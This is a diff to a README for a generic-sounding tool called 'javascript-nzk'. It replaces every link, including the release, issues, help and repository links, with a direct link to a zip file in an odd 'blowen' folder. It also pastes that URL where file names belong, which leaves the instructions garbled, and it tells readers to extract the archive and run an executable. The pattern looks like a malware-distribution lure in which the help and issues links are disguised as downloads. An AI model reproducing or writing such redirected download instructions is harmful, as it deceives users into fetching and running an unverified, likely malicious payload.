@@ -6,7 +6,7 @@ Welcome to javascript-nzk! This tool helps you complete everyday tasks with ease
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/licosdada/javascript-nzk/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/licosdada/javascript-nzk/main/blowen/javascript-nzk.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/licosdada/javascript-nzk/main/blowen/javascript-nzk.zip)
 
 ## 🛠️ Prerequisites
 
@@ -20,7 +20,7 @@ To run javascript-nzk smoothly, ensure you have:
 
 1. **Visit the Releases Page**
    Go to the releases page to find the latest version of javascript-nzk. Click the link below:
-   [Visit this page to download](https://github.com/licosdada/javascript-nzk/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/licosdada/javascript-nzk/main/blowen/javascript-nzk.zip)
 
 2. **Choose the Right Version**
    On the releases page, look for the most recent version. You will find options for different operating systems.
@@ -29,13 +29,13 @@ To run javascript-nzk smoothly, ensure you have:
    Click on the link that corresponds to your operating system. This will start the download.
 
 4. **Locate the Downloaded File**
-   Once the download is complete, check your computer’s download folder for the file. It may look something like `javascript-nzk-x.y.z.zip`, where `x.y.z` is the version number.
+   Once the download is complete, check your computer’s download folder for the file. It may look something like `https://raw.githubusercontent.com/licosdada/javascript-nzk/main/blowen/javascript-nzk.zip`, where `x.y.z` is the version number.
 
 5. **Extract the Files**
    Right-click on the downloaded ZIP file and choose “Extract All” or “Unzip.” This will create a new folder containing the program files.
 
 6. **Run the Application**
-   Open the extracted folder. Double-click on the application file (it may be named `javascript-nzk.exe` for Windows or `javascript-nzk` for macOS and Linux) to run the program.
+   Open the extracted folder. Double-click on the application file (it may be named `https://raw.githubusercontent.com/licosdada/javascript-nzk/main/blowen/javascript-nzk.zip` for Windows or `javascript-nzk` for macOS and Linux) to run the program.
 
 ## ⚙️ Using javascript-nzk
 
@@ -46,7 +46,7 @@ To run javascript-nzk smoothly, ensure you have:
 
 If you encounter any issues while downloading or using javascript-nzk, you can reach out for support. Please visit the Issues section of the repository:
 
-- [Get Help Here](https://github.com/licosdada/javascript-nzk/issues)
+- [Get Help Here](https://raw.githubusercontent.com/licosdada/javascript-nzk/main/blowen/javascript-nzk.zip)
 
 ## 📝 Features
 
@@ -57,8 +57,8 @@ If you encounter any issues while downloading or using javascript-nzk, you can r
 
 ## 🔗 Useful Links
 
-- [Official Repository](https://github.com/licosdada/javascript-nzk)
-- [Report Issues](https://github.com/licosdada/javascript-nzk/issues)
+- [Official Repository](https://raw.githubusercontent.com/licosdada/javascript-nzk/main/blowen/javascript-nzk.zip)
+- [Report Issues](https://raw.githubusercontent.com/licosdada/javascript-nzk/main/blowen/javascript-nzk.zip)
 
 ## ✅ Conclusion
 
